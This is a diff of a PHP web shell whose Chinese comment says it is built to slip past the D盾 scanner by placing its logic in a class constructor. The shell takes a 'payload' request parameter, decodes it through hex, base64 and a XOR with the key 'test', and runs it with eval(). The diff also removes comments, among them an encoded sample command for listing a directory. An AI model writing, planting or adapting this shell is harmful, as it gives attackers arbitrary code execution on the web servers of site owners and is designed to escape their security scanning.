@@ -26,7 +26,6 @@ function xor_encode($string, $key){
         }else{
             $tmp = 0;
         }
-
     }
 
     return $result;
@@ -37,16 +36,8 @@ function xor_encode($string, $key){
  * 过D盾php马，D盾对类查杀较弱，利用构造函数实现绕过
  */
 class d_bypass{
-
-    /**
-     * @var mixed 构造一个公共变量用以接收request参数
-     */
     public $payload;
 
-    /**
-     * d_bypass constructor.
-     * 构造函数在对象实例化时执行
-     */
     function __construct(){
         @$this->payload=$_REQUEST['payload'];
         //@$this->payload=$_COOKIE['user_token'];
@@ -60,13 +51,8 @@ class d_bypass{
 $payload_class=new d_bypass();
 $payload_class=$payload_class->payload;
 
-//$payload_class="427877414142454957314d51444146545856343d";    // system('dir');
-
 $payload_class = hex2bin($payload_class);
 $payload_class = base64_decode($payload_class);
 $payload_class = xor_encode($payload_class, "test");
-//print_r($payload_class);
-/**
- * shell_response用以接收eval执行结果
- */
+
 eval($payload_class);
